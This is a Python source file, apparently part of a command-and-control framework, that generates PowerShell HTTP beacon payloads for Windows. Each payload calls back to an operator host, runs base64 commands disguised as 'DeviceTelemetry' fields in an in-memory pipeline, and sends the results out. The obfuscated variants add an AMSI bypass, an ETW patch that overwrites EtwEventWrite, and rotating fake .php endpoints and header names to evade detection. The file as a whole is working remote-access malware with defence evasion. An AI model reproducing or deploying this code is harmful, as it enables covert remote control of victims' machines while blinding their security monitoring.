import base64
from core.payload_generator.common import payload_utils as payutils
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

def make_raw(ip, port, beacon_interval, headers, useragent, accept, byte_range, jitter):
	beacon_url = f"http://{ip}:{port}/"
	interval = beacon_interval

	formatted_headers = payutils.build_powershell_headers(headers) if headers else ""

	if accept:
		accept_header = f"$req.Accept = '{accept}';"

	else:
		accept_header = ""

	if byte_range:
		byte_range = f"$req.AddRange(0, {byte_range});"

	else:
		byte_range = ""

	raw = (
		f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
		f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
		f"$sid=G-SID;$uri='{beacon_url}';"
		"[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
		"$hdr=@{'X-Session-ID'=$sid};"

		# Define Get-Task
		"Function Get-Task {"
		"$req = [System.Net.HttpWebRequest]::Create($uri);"
		"$req.Method = 'GET';"
		"$req.Headers.Add('X-Session-ID',$sid);"
		f"{formatted_headers}"
		f"$req.UserAgent = '{useragent}';"
		f"{accept_header}"
		f"{byte_range}"
		"$resp = $req.GetResponse();"
		"$stream = $resp.GetResponseStream();"
		"$reader = New-Object System.IO.StreamReader($stream);"
		"$result = $reader.ReadToEnd();"
		"$reader.Close();$stream.Close();$resp.Close();"
		"return $result"
		"};"

		# Define Send-Output
		"Function Send-Output($payload) {"
		"$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
		"$req = [System.Net.HttpWebRequest]::Create($uri);"
		"$req.Method = 'POST';"
		"$req.ContentType = 'application/json';"
		"$req.Headers.Add('X-Session-ID',$sid);"
		f"{formatted_headers}"
		f"$req.UserAgent = '{useragent}';"
		f"{accept_header}"
		f"{byte_range}"
		"$req.ContentLength = $bytes.Length;"
		"$stream = $req.GetRequestStream();"
		"$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
		"$resp = $req.GetResponse();$resp.Close()"
		"};"

		# Init PS pipeline
		"$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
		"$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
		"$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

		# Beacon loop
		"while($true){"
		"try{"
		"$taskJson = Get-Task;"
		"$task = ConvertFrom-Json $taskJson;"
		"if($task.DeviceTelemetry){"
		"$cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.DeviceTelemetry.Telemetry));"
		"$pipeline.Commands.Clear();"
		"$pipeline.AddScript($cmd)|Out-Null;"
		"$results = $pipeline.Invoke();"
		"$output = $results|Out-String;"
		"$b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
		"$body = @{output=$b64}|ConvertTo-Json;"
		"Send-Output $body;"
		"}"
		"}catch{};"
		f"$jitter = {jitter};"
        f"$jitmax = $jitter + 30;"
        f"if ($jitter -eq 0) {{ $delay = {interval} }} else {{ "
        f"$percent = Get-Random -Minimum -$jitter -Maximum $jitmax;"
        f"$j = [Math]::Floor(({interval} * $percent) / 100);"
        f"$delay = {interval} + $j; if ($delay -lt 1) {{ $delay = 1 }} }}"
        "Start-Sleep -Seconds $delay;"
        "}"
	)

	return raw



def generate_windows_powershell_http(ip, port, obs, beacon_interval, headers, useragent, accept, byte_range, jitter=0, no_child=None):

	if obs is None or obs == 0:
		payload = make_raw(ip, port, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter)
		cmd = payutils.encode_win_payload(payload, no_child)
		payutils.copy_and_print(cmd)
		return cmd

	if obs == 1:
		payload = generate_windows_powershell_http_obfuscate_level1(ip, port, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter)
		cmd = payutils.encode_win_payload(payload, no_child)
		payutils.copy_and_print(cmd)
		return cmd

	elif obs == 2:
		print(brightgreen + useragent)
		payload = generate_windows_powershell_http_obfuscate_level2(ip, port, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter)
		cmd = payutils.encode_win_payload(payload, no_child)
		payutils.copy_and_print(cmd)
		return cmd
		
	"""else:
		return _obfuscate_level3(template)"""

def generate_windows_powershell_http_obfuscate_level1(ip, port, beacon_interval, headers, useragent, accept, byte_range, jitter):
	beacon_url = f"http://{ip}:{port}/"
	interval = beacon_interval

	formatted_headers = payutils.build_powershell_headers(headers) if headers else ""

	if accept:
		accept_header = f"$req.Accept = '{accept}';"

	else:
		accept_header = ""

	if byte_range:
		byte_range = f"$req.AddRange(0, {byte_range});"

	else:
		byte_range = ""

	one_liner = (
	f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
	f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
	f"$sid=G-SID;$uri='{beacon_url}';"
	f"[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
	f"$hdr=@{{'X-Session-ID'=$sid}};"

	# AMSI bypass
	"$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]]"
	"(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
	"$n='Non'+'Public';$s='Static';"
	"$f=$e.GetField(([string]::Join('',[char[]]"
	"(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);"
	"$t=[type[]]@([object],[bool]);"
	"$m=$f.GetType().GetMethod('Set'+'Value',$t);"
	"$m.Invoke($f,@($null,$true));"

	# ETW bypass
	"Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{"
	"[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);"
	"[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);"
	"[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';"
	"$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');"
	"$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');"
	"$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');"
	"$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');"
	"$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);"
	"$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;"
	"$peOff=$ntbase.ToInt64()+0x3C;$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);"
	"$etblOff=$ntbase.ToInt64()+$pe+0x88;"
	"$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);"
	"$exptVA=$ntbase.ToInt64()+$expt;"
	"$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));"
	"$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));"
	"$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;"
	"$etwptr=0;for($i=0;$i-lt$fnCount;$i++){"
	"$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));"
	"$namePtr=($ntbase.ToInt64()+$nameRVA);"
	"$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++){$currName+=[char]$c};"
	"if($currName-eq$e){$etwptr=$namePtr;break}};"
	"$etwAddr=[IntPtr]$etwptr;"
	"$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));"
	"[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"

	# Define GET using .NET
	"Function Get-Task {"
	"$req = [System.Net.HttpWebRequest]::Create($uri);"
	"$req.Method = 'GET';"
	"$req.Headers.Add('X-Session-ID',$sid);"
	f"{formatted_headers}"
	f"$req.UserAgent = '{useragent}';"
	f"{accept_header}"
	f"{byte_range}"
	"$resp = $req.GetResponse();"
	"$stream = $resp.GetResponseStream();"
	"$reader = New-Object System.IO.StreamReader($stream);"
	"$result = $reader.ReadToEnd();"
	"$reader.Close();$stream.Close();$resp.Close();"
	"return $result"
	"}"

	# Define POST using .NET
	"Function Send-Output($payload) {"
	"$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
	"$req = [System.Net.HttpWebRequest]::Create($uri);"
	"$req.Method = 'POST';"
	"$req.ContentType = 'application/json';"
	"$req.Headers.Add('X-Session-ID',$sid);"
	f"{formatted_headers}"
	f"$req.UserAgent = '{useragent}';"
	f"{accept_header}"
	f"{byte_range}"
	"$req.ContentLength = $bytes.Length;"
	"$stream = $req.GetRequestStream();"
	"$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
	"$resp = $req.GetResponse();$resp.Close()"
	"}"

	# PowerShell pipeline init
	"$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
	"$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
	"$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

	# Beacon loop
	f"while($true){{"
	"try{"
	"    $taskJson = Get-Task;"
	"    $task = ConvertFrom-Json $taskJson;"
	"    if($task.DeviceTelemetry){"
	"        $cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.DeviceTelemetry.Telemetry));"
	"        $pipeline.Commands.Clear();"
	"        $pipeline.AddScript($cmd)|Out-Null;"
	"        $results = $pipeline.Invoke();"
	"        $output = $results|Out-String;"
	"        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
	"        $body = @{output=$b64}|ConvertTo-Json;"
	"        Send-Output $body;"
	"    };"
	"}"
	"catch{};"
	f"$jitter = {jitter};"
    f"$jitmax = $jitter + 30;"
    f"if ($jitter -eq 0) {{ $delay = {interval} }} else {{ "
    f"$percent = Get-Random -Minimum -$jitter -Maximum $jitmax;"
    f"$j = [Math]::Floor(({interval} * $percent) / 100);"
    f"$delay = {interval} + $j; if ($delay -lt 1) {{ $delay = 1 }} }}"
    "Start-Sleep -Seconds $delay;"
    "}"
)

	return one_liner

def generate_windows_powershell_http_obfuscate_level2(ip, port, beacon_interval, headers, useragent, accept, byte_range, jitter):
	"""
	HTTP-based Windows reverse shell, with randomized PHP endpoints,
	fake browser headers, obfuscated C2 header keys and System.Text.Json parsing.
	"""
	# list of fake .php pages
	pages = ["admin.php","upload.php","maintainence.php","background.php","painters.php", "backup.php"]
	# obfuscated header keys
	hdrs = {"X-Session-ID": [88,45,83,101,115,115,105,111,110,45,73,68], "X-API-KEY": [88,45,65,80,73,45,75,69,89], "X-Forward-Key": [88,45,70,111,114,119,97,114,100,45,75,101,121]}

	hdr_keys = ["X-Session-ID", "X-API-KEY", "X-Forward-Key"]
	pages_literal = ", ".join(f"'{p}'" for p in pages)
	hdr_keys_literal  = ", ".join(f"'{h}'" for h in hdr_keys)

	formatted_headers = payutils.build_powershell_headers(headers, nostart=True, first=True) if headers else ""
	formatted_headers2 = payutils.build_powershell_headers(headers, nostart=True) if headers else ""

	if accept:
		accept_header = f"$req.Accept = '{accept}';"
		accept_header2 = f"$req2.Accept = '{accept}';"

	else:
		accept_header = ""
		accept_header2 = ""

	if byte_range:
		byte_range = f"$req.AddRange(0, {byte_range});"
		byte_range2 = f"$req2.AddRange(0, {byte_range});"

	else:
		byte_range = ""
		byte_range2 = ""

	beacon_url = f"http://{ip}:{port}/"
	interval = beacon_interval


	# build the raw PowerShell one-liner
	ps_lines = (
    # Session ID generator
    "Function G-SID {"
    "    $c = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
    "    $p = @();"
    "    1..3 | % { $p += -join(1..5 | % { $c | Get-Random }) };"
    "    $p -join '-'"
    "};"
    "$sid = G-SID;"
    "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"

    # AMSI bypass
    "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]]"
    "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
    "$n='Non'+'Public';$s='Static';"
    "$f=$e.GetField(([string]::Join('',[char[]]"
    "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);"
    "$t=[type[]]@([object],[bool]);"
    "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
    "$m.Invoke($f,@($null,$true));"

    # Headers & Pages
    f"$pages = @({pages_literal});"
    f"$hdrArr = @({hdr_keys_literal});"

    # Output wrapper
    "Function Send-Output($payload) {"
    "    $page = $pages | Get-Random;"
    f"   $uri = 'http://{ip}:{port}/' + $page;"
    "    $req2 = [System.Net.HttpWebRequest]::Create($uri);"
    "    $req2.Method = 'POST';"
    "    $req2.ContentType = 'application/json';"
    "    $hdr = $hdrArr | Get-Random;"
    "    $req2.Headers.Add($hdr, $sid);"
    f"   {formatted_headers2}"
    f"   $req2.UserAgent = '{useragent}';"
    f"   {accept_header2}"
    f"   {byte_range2}"
    "    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
    "    $req2.ContentLength = $bytes.Length;"
    "    $s = $req2.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close();"
    "    $resp = $req2.GetResponse(); $resp.Close();"
    "};"

    # Pipeline init
    "$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
    "$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
    "$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

    # Beacon loop
    "while ($true) {"
    "try {"
    "    $page = $pages | Get-Random;"
    f"    $uri = 'http://{ip}:{port}/' + $page;"
    "    $req = [System.Net.HttpWebRequest]::Create($uri);"
    "    $req.Method = 'GET';"
    "    $hdr = $hdrArr | Get-Random;"
    "    $req.Headers.Add($hdr, $sid);"
    f"   {formatted_headers}"
    f"   $req.UserAgent = '{useragent}';"
    f"   {accept_header}"
    f"   {byte_range}"
    "    $resp = $req.GetResponse();"
    "    $stream = $resp.GetResponseStream();"
    "    $reader = New-Object System.IO.StreamReader($stream);"
    "    $taskJson = $reader.ReadToEnd();"
    "    $reader.Close(); $stream.Close(); $resp.Close();"
    "    $task = $taskJson | ConvertFrom-Json;"
    "    if ($task.DeviceTelemetry) {"
    "        $cmd = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.DeviceTelemetry.Telemetry));"
    "        $pipeline.Commands.Clear();"
    "        $pipeline.AddScript($cmd) | Out-Null;"
    "        $results = $pipeline.Invoke();"
    "        $output = $results | Out-String;"
    "        $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output.Trim()));"
    "        $json = @{output=$b64} | ConvertTo-Json -Compress;"
    "        Send-Output $json;"
    "    }"
    "} catch {}"

    # Jitter-safe sleep logic
    f"$jitter = {jitter};"
    f"if ($jitter -eq 0) {{ $delay = {interval} }} else {{ "
    f"  $percent = Get-Random -Minimum -$jitter -Maximum $jitter;"
    f"  $j = [Math]::Floor(({interval} * $percent) / 100);"
    f"  $delay = {interval} + $j;"
    f"  if ($delay -lt 1) {{ $delay = 1 }}; if ($delay -gt 2147483) {{ $delay = 2147483 }} }}"
    "Start-Sleep -Seconds $delay;"
    "}"
)
	
	return ps_lines